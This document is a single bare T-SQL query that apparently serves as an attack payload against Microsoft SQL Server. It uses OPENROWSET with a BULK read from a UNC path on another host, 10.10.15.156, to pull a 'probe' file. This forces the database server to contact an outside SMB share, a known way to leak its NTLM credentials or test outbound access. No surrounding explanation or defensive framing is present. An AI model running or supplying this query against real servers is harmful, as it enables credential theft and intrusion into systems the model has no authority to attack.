SELECT BulkColumn FROM OPENROWSET(BULK '\\10.10.15.156\share\probe.txt', SINGLE_CLOB) AS file_data
